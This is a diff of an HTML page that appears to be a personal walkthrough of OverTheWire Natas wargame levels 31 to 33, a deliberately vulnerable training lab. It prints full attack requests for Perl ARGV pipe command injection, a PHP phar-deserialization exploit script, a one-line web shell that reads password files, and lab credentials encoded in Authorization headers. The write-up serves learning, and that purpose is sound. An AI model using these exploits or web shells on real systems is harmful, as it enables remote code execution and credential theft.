@@ -542,46 +542,135 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=---------------------------243000595620820762682363204443
-Content-Length: 680
+Content-Type: multipart/form-data; boundary=---------------------------10540672251980217723772833326
+Content-Length: 677
 Origin: http://natas31.natas.labs.overthewire.org
 Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
 Connection: keep-alive
-Referer: http://natas31.natas.labs.overthewire.org/index.pl
+Referer: http://natas31.natas.labs.overthewire.org/
 Cookie: _ga_RD0K2239G0=GS2.1.s1754900659$o19$g0$t1754900659$j60$l0$h0; _ga=GA1.1.1589158299.1753534300
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
------------------------------243000595620820762682363204443
-Content-Disposition: form-data; name="file"
-ARGV
+-----------------------------10540672251980217723772833326
+Content-Disposition: form-data; name="file";
+Content-Type: text/csv
 
------------------------------243000595620820762682363204443
+ARGV
+-----------------------------10540672251980217723772833326
 Content-Disposition: form-data; name="file"; filename="username.csv"
 Content-Type: text/csv
 
 Username; Identifier;First name;Last name
 booker12;9012;Rachel;Booker
+grey07;2070;Laura;Grey
+johnson81;4081;Craig;Johnson
+jenkins46;9346;Mary;Jenkins
+smith79;5079;Jamie;Smith
 
------------------------------243000595620820762682363204443
 
+-----------------------------10540672251980217723772833326
 Content-Disposition: form-data; name="submit"
 
 Upload
-
------------------------------243000595620820762682363204443--
-
-Password will be listed here</code></pre>
+-----------------------------10540672251980217723772833326--
+</code></pre>
     </ul>
 
     <h2>Level 32</h2>
     <ul>
-        <p>The website show us some files to read which lead to nowhere</p>
-        <p>First we figure out that to execute commands we need the %00 at the end  (|command%00)</p>
-        <p>But thats not all, natas word is restricted so we used wildcards to read the file</p>
-        <pre><code class="language-url">http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/nat*as_webpass/nat*s30%00</code></pre>
+        <p>We are using the same technique as the previous lab, but this time we are performing a RCE</p>
+        <p>Passing two files and providing an argument here you can see the whole petition </p>
+        <p>For this lab there is a file called which needs to be executed to retrieve the password</p>
+        <pre><code class="language-url">POST /index.pl?./getpassword%20| HTTP/1.1
+Host: natas32.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------16932740703391401763649088328
+Content-Length: 570
+Origin: http://natas32.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
+Connection: keep-alive
+Referer: http://natas32.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1756111010$o20$g1$t1756111027$j43$l0$h0; _ga=GA1.1.1589158299.1753534300
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+-----------------------------16932740703391401763649088328
+
+Content-Disposition: form-data; name="file"
+
+ARGV
+-----------------------------16932740703391401763649088328
+
+Content-Disposition: form-data; name="file"; filename="username.csv"
+Content-Type: text/csv
+
+
+Username; Identifier;First name;Last name
+booker12;9012;Rachel;Booker
+grey07;2070;Laura;Grey
+johnson81;4081;Craig;Johnson
+jenkins46;9346;Mary;Jenkins
+smith79;5079;Jamie;Smith
+
+
+-----------------------------16932740703391401763649088328
+Content-Disposition: form-data; name="submit"
+
+
+Upload
+-----------------------------16932740703391401763649088328--</code></pre>
     </ul>
 
+    <h2>Level 33</h2>
+    <ul>
+        <p>Looking at the code we figure out an important thing which is that first the file is uploaded and then if the comparision of hashes returns true the contents of it are executed.</p>
+        <p>We can take advantage of it by using phar which is a php archive (A file format which is packet and allows to store php code and resources) </p>
+        <p>The way of solving this lab is the following</p>
+        <p>Create a file named natas33.php with the following content. The code allow us to modify the variables which tell which file will be compared and the value of the signature which will be always true, the the rest of it it is to create the phar.</p>
+        <pre><code class="language-php">&lt;?php
+
+class Executor{
+    private $filename = "shell.php";
+    private $signature = True;
+    private $init = false;
+}
+
+$phar = new Phar('natas.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('&lt;?php __HALT_COMPILER(); ? >');
+
+$object = new Executor();
+$object->data = 'rips';
+$phar->setMetadata($object);
+$phar->stopBuffering();
+
+?></code></pre>
+
+        <p>As this phar executes the file shell.php we need to create it and set the following content inside of it</p>
+
+        <pre><code class="language-php">&lt;?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?></code></pre>
+
+        <p>Finally we will execute the natas33.php which will result in the .phar file</p>
+
+        <pre><code class="language-bash">php -d phar.readonly=false natas33.php</code></pre>
+
+        <p>With the 3 files we need to upload them all to the server but there is a thing to consider, everytime you upload a file its name is changed for the value of the phpsessid so we will need to intercept the petition and change the value for the filename which we are uploading</p>
+
+        <p>Steps: (Remember to modify all names)
+        <p>1. Upload natas.phar</p>
+        <p>2. Upload shell.php</p>
+        <p>3. Upload any file and instead of phpsessid place (phar://natas.phar/test.txt)</p>
+
+        <p>Since the phar is executed the test.txt will go to find shell.php and this one wil print the content of /etc/natas_webpass/natas34</p>
+        </ul>
+
+        <h2 class="notion-link">Finished on 25/08/2025</h2>
         </div>
     </div>
 
